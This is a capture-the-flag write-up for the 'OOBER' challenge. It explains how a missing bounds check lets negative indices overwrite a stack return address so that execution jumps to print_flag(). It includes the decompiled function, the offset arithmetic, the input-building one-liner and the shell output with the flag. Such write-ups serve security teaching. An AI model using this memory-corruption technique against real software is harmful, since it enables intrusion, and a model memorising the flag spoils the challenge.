## OOBER [130]
## Solution:
`generate_counts()` reads the file specified in `argv[0]` byte-by-byte. It appears to filter out all non-alphanumeric characters, but it is actually not quite as constrained. `generate_counts()` can be decompiled to the following C code:
```C
void generate_counts(int fd, char* mainbuf) {

  char c;
  
  while(read(fd, &c, 1)) {

    if (c == ' ') continue;
    if (c == '\n') continue;
    
    // convert lowercase to uppercase for [a-z]
    if (c <= 'z') {
      if (c >= 'a') {
        c -= 0x20;
      }
    }
    
    mainbuf[c-0x41]++;
  }
}
```

Because `generate_counts()` does not filter out all values, we can write to indices outside of the expected range for `counts[]`. In this case, we will use a *negative* index into `counts[]` to overwrite the return address into `main()` stored on the stack of `analyze_input()`. `counts[]` is located at `0xffffceb6` and the return address on the stack of `analyze_input()` is at `0xffffce9c`. This means that in order to overwrite the return address, we will need to index into `counts[]` at offsets `0xffffce9c` - `0xffffceb6` = `-0x1a` (-26). 

ASCII uppercase letters fall in the range `[0x41:0x5a]`. However, `generate_counts()` fails to discard bytes below `0x41` (ASCII `A`). It will still subtract `0x41` from them to determine the offset into `counts[]`. In this way, we can arbitrarily increment stack variables *below* `counts[]` on the stack by forcing a negative offset. We want to influence bytes at offsets `-0x1a`, `-0x19`, `-0x18`, and `-0x17`. Thus, we will use the following bytes:
```
0x41 - 0x1a = 0x27 --> ASCII "'"
0x41 - 0x19 = 0x28 --> ASCII "("
0x41 - 0x18 = 0x29 --> ASCII ")"
0x41 - 0x17 = 0x2a --> ASCII "*"
```

The normal value of the return address is `0x080486ed`, or the bytes `0xed`, `0x86`, `0x04`, and `0x08` when accounting for little-endianness. We need the return address to change to the address of `print_flag()` at `0x0804859b`, or the bytes `0x9b`, `0x85`, `0x04`, and `0x08` when accounting for little-endianness. Since the first two bytes are the same for the address, we only need to change the bytes at `counts[-26]` and `counts[-25]`:
```
0xed + 0xae (174) = 0x9b
0x86 + 0xff (255) = 0x85
```

Now we can generate an input file to correctly influence the return address:
```
ameise@shell:~$ cd /home/problems/104e1f5b6f2766fd756cf5cdba4ff65b/oober_5
ameise@shell:/home/problems/104e1f5b6f2766fd756cf5cdba4ff65b/oober_5$ ls
flag  oober
ameise@shell:/home/problems/104e1f5b6f2766fd756cf5cdba4ff65b/oober_5$ python -c 'print "\x27"*174 + "\x28"*255' > /tmp/ameise/input
ameise@shell:/home/problems/104e1f5b6f2766fd756cf5cdba4ff65b/oober_5$ ./oober /tmp/ameise/input
Welcome to frequency analyzer
Most likely caesar shift is by 0
Most probable plaintext: ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((


Your flag is: i_teach_you_the_oobermensch_E19cBa5BfB68b8A3